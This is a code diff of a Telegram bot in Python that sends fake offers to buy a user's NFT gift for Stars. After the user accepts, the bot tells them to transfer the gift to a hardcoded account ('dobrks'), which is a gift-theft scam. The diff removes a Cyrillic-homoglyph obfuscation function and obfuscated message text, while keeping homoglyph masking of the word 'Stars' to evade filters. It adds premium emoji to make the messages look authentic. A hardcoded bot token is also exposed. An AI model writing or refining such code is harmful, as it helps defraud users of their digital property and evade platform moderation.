@@ -2,7 +2,6 @@ import asyncio
 import json
 import logging
 import os
-import random
 import re
 import uuid
 
@@ -21,6 +20,11 @@ load_dotenv()
 BOT_TOKEN = "8896265487:AAHqtRXlVytqFHMZE7xUOaWZs6WmPFdLbvk"
 NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
 ADMIN_ID = 7875607629
+
+# Premium emoji IDs
+EMOJI_GIFT = "5875180111744995604"
+EMOJI_CHECK = "5776375003280838798"
+EMOJI_CROSS = "5778527486270770928"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -70,22 +74,6 @@ def format_amount(value: str) -> str:
 def mask_stars(currency: str) -> str:
     return "Ѕtаrѕ" if currency.lower() == "stars" else currency.capitalize()
 
-HOMOGLYPH_CYR = {"а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y"}
-
-def randomize_text(text: str) -> str:
-    result = []
-    i = 0
-    while i < len(text):
-        if text[i] == "<":
-            end = text.find(">", i)
-            if end != -1:
-                result.append(text[i:end+1])
-                i = end + 1
-                continue
-        result.append(HOMOGLYPH_CYR.get(text[i], text[i]))
-        i += 1
-    return "".join(result)
-
 SLUG_RE = re.compile(r"^([A-Za-z][A-Za-z0-9_\-]*?)-(\d+)$")
 
 def parse_nft_input(arg: str):
@@ -129,8 +117,8 @@ async def cmd_rep(message: types.Message):
 
     text = (
         f"{preview}"
-        f"Пοльзοвaтeль <b>{buyer}</b> пpeдлaгaeт Baм <b>{amount} {mask_stars(currency)}</b> зa пoдapoк <b>{nft_link}</b>.\n\n"
-        f"Пpeдлoжeниe дeйcтвyeт eщё <b>5ч 59м.</b>"
+        f"<tg-emoji emoji-id=\"{EMOJI_GIFT}\">🎁</tg-emoji> Пользователь <b>{buyer}</b> предлагает Вам <b>{amount} {mask_stars(currency)}</b> за подарок <b>{nft_link}</b>.\n\n"
+        f"Предложение действует ещё <b>5ч 59м.</b>"
     )
 
     try:
@@ -167,7 +155,7 @@ async def on_accept(cb: CallbackQuery):
     nft_link = f'<a href="{offer["nft_url"]}">{offer["nft_name"]}</a>'
     preview = f'<a href="{offer["nft_url"]}">&#8203;</a>'
     text = (
-        f"{preview}🎁 Подарок: <b>{nft_link}</b> успешно продан!\n\n"
+        f"{preview}<tg-emoji emoji-id=\"{EMOJI_GIFT}\">🎁</tg-emoji> Подарок: <b>{nft_link}</b> успешно продан!\n\n"
         f"• Передайте подарок покупателю для зачисления {mask_stars(offer['currency'])}."
     )
 
@@ -200,7 +188,7 @@ async def on_decline(cb: CallbackQuery):
             chat_id=cb.message.chat.id,
             message_id=cb.message.message_id,
             business_connection_id=cb.message.business_connection_id,
-            text="❌ Вы отклонили предложение",
+            text=f"<tg-emoji emoji-id=\"{EMOJI_CROSS}\">❌</tg-emoji> Вы отклонили предложение",
             parse_mode="HTML"
         )
     except Exception:
